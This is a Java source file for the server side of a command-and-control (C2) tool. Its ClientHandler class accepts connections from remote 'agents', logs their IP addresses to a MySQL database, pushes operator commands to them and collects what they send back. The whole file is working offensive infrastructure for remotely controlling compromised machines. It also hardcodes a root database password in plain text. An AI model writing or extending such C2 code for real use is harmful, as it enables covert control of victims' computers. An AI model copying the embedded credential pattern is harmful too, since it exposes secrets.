package com.amtzespinosa.c2server;

import java.io.*;
import java.net.*;
import java.sql.*;
import java.util.*;

public class ClientHandler implements Runnable {
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    protected String agentId;
    private List<String> commandHistory;
    private final Object lock = new Object(); // Lock to synchronize responses
    private StringBuilder responseBuffer = new StringBuilder(); // ✅ Buffer to store full response

    public ClientHandler(Socket socket) {
        this.socket = socket;
        this.agentId = generateAgentId();
        this.commandHistory = new ArrayList<>();
    }

    public String getAgentId() {
        return agentId;
    }

    public List<String> getCommandHistory() {
        return commandHistory;
    }

    @Override
    public void run() {
        try {
            String ip = socket.getInetAddress().getHostAddress();
            String os = System.getProperty("os.name");

            C2Listener.clientConnections.put(agentId, this);
            System.out.println("[+] Agent connected: " + agentId + " from " + ip);

            saveConnectionToDB(agentId, ip, os);

            try (InputStream input = socket.getInputStream();
                 OutputStream output = socket.getOutputStream()) {

                reader = new BufferedReader(new InputStreamReader(input));
                writer = new PrintWriter(output, true);

                writer.println("[+] Connected to C2 server. Type commands:");

                String line;
                while ((line = reader.readLine()) != null) {
                    synchronized (lock) {
                        responseBuffer.append(line).append("\n"); // ✅ Append multiple lines
                        lock.notify(); // Notify waiting thread that response is ready
                    }
                }
            }
        } catch (IOException e) {
            System.out.println("[-] Connection lost: " + agentId + " - " + e.getMessage());
        } finally {
            C2Listener.clientConnections.remove(agentId);
            closeResources();
        }
    }

    public String sendCommand(String command) {
        if (writer != null) {
            synchronized (lock) {
                responseBuffer.setLength(0); // ✅ Clear previous response before sending
                writer.println(command);
                commandHistory.add("Sent Command: " + command);
                System.out.println("[C2] Sent command to " + agentId + ": " + command);

                return getResponse(); // ✅ Wait and return full response
            }
        } else {
            System.out.println("[-] Cannot send command, agent " + agentId + " is disconnected.");
            return "Error: Agent is disconnected.";
        }
    }

    private String getResponse() {
        synchronized (lock) {
            try {
                lock.wait(5000); // ✅ Wait up to 5 seconds for response
            } catch (InterruptedException e) {
                System.out.println("[-] Response wait interrupted.");
            }

            String response = responseBuffer.toString().trim(); // ✅ Get full response
            commandHistory.add("Agent Response:\n" + response);
            return response;
        }
    }

    private void closeResources() {
        try {
            if (reader != null) reader.close();
            if (writer != null) writer.close();
            if (socket != null) socket.close();
        } catch (IOException e) {
            System.out.println("[-] Error closing resources for " + agentId);
        }
    }

    protected String generateAgentId() {
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        Random rand = new Random();
        StringBuilder sb = new StringBuilder(8);
        for (int i = 0; i < 8; i++) {
            sb.append(characters.charAt(rand.nextInt(characters.length())));
        }
        return sb.toString();
    }

    private void saveConnectionToDB(String agentId, String ip, String os) {
        String url = "jdbc:mysql://localhost:3306/c2server";
        String user = "root";
        String password = "w0DSQGYPsvARiBVTiwKKH3otYZ4rxKGu"; // Use environment variables for security

        try (Connection conn = DriverManager.getConnection(url, user, password);
             PreparedStatement pstmt = conn.prepareStatement("INSERT INTO agents (agent_id, ip, os) VALUES (?, ?, ?)")) {

             pstmt.setString(1, agentId);
             pstmt.setString(2, ip);
             pstmt.setString(3, os);
             pstmt.executeUpdate();
             System.out.println("[+] Connection saved to DB: " + agentId);
        } catch (SQLException e) {
             System.out.println("[-] Database error: " + e.getMessage());
        }
    }
}
